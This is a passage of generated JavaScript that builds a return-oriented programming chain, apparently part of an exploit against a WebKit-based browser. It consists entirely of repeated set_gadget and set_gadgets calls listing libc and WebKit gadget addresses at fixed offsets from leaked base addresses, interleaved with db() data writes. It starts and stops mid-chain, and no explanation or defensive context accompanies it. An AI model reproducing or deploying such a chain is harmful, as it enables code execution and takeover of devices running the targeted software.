webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+108544,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+108624,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([3, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+108728,
webkit_base+7438103,
libc_base+793877,
ropchain+108744,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+108832,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+108888,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+108992,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+109096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+109112,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+109256,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+109224,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+109240,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+109328,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+109384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+109464,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([22, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+109568,
webkit_base+7438103,
libc_base+793877,
ropchain+109584,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+109672,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+109728,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+109800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+109856,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+7438103,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+109992,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+110096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+110112,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+110256,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+110224,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+110240,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+110328,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+110384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+110464,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([23, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+110568,
webkit_base+7438103,
libc_base+793877,
ropchain+110584,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+110672,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+110728,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+110800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+110856,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+206806,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+110992,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+111096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+111112,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+111256,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+111224,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+111240,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+111328,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+111384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+111464,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([24, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+111568,
webkit_base+7438103,
libc_base+793877,
ropchain+111584,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+111672,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+111728,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+111800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+111856,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+111944,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+112048,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+112064,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+112208,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+112176,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+112192,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+112280,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+112336,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+112416,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([4, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+112520,
webkit_base+7438103,
libc_base+793877,
ropchain+112536,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+112624,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+112680,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+112784,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+112888,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+112904,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+113048,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+113016,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+113032,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+113120,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+113176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+113256,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([25, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+113360,
webkit_base+7438103,
libc_base+793877,
ropchain+113376,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+113464,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+113520,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+113592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+113648,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+8975893,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+113784,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+113888,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+113904,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+114048,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+114016,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+114032,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+114120,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+114176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+114256,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([26, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+114360,
webkit_base+7438103,
libc_base+793877,
ropchain+114376,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+114464,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+114520,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+114592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+114648,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+206806,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+114784,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+114888,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+114904,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+115048,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+115016,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+115032,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+115120,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+115176,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+115256,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([27, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+115360,
webkit_base+7438103,
libc_base+793877,
ropchain+115376,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+115464,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+115520,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+115592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+115648,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+115736,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+115840,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+115856,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+116000,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+115968,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+115984,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+116072,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+116128,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+116208,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([3, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+116312,
webkit_base+7438103,
libc_base+793877,
ropchain+116328,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+116416,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+116472,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+116576,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+116680,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+116696,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+116840,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+116808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+116824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+116912,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+116968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+117048,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([28, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+117152,
webkit_base+7438103,
libc_base+793877,
ropchain+117168,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+117256,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+117312,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+117384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+117440,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+1026352,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+117576,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+117680,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+117696,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+117840,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+117808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+117824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+117912,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+117968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+118048,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([29, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+118152,
webkit_base+7438103,
libc_base+793877,
ropchain+118168,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+118256,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+118312,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+118384,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+118440,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+206806,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+118576,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+118680,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+118696,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+118840,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+118808,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+118824,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+118912,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+118968,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+119048,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([30, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+119152,
webkit_base+7438103,
libc_base+793877,
ropchain+119168,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
